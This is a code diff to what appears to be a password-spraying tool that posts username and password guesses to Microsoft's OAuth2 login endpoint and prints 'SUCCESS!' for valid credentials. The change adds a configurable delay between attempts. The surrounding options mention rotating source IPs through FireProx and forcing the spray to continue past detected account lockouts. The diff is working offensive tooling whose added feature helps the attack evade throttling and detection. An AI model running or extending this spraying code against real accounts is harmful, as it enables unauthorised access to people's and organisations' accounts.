@@ -25,6 +25,7 @@ parser.add_argument("-o", "--out", metavar="OUTFILE", help="A file to output val
 parser.add_argument("-f", "--force", action='store_true', help="Forces the spray to continue and not stop when multiple account lockouts are detected.")
 parser.add_argument("--url", default="https://login.microsoft.com", help="The URL to spray against (default is https://login.microsoft.com). Potentially useful if pointing at an API Gateway URL generated with something like FireProx to randomize the IP address you are authenticating from.")
 parser.add_argument("-v", "--verbose", action="store_true", help="Prints usernames that could exist in case of invalid password")
+parser.add_argument("-s", "--sleep", help="Sleep this many seconds between tries")
 
 args = parser.parse_args()
 
@@ -33,6 +34,7 @@ url = args.url
 force = args.force
 out = args.out
 verbose = args.verbose
+sleep = args.sleep
 
 usernames = []
 with open(args.userlist, "r") as userlist:
@@ -69,6 +71,9 @@ for username in usernames:
     }
 
     r = requests.post(f"{url}/common/oauth2/token", headers=headers, data=body)
+
+    if sleep is not None:
+        time.sleep(int(sleep))
 
     if r.status_code == 200:
         print(f"SUCCESS! {username} : {password}")
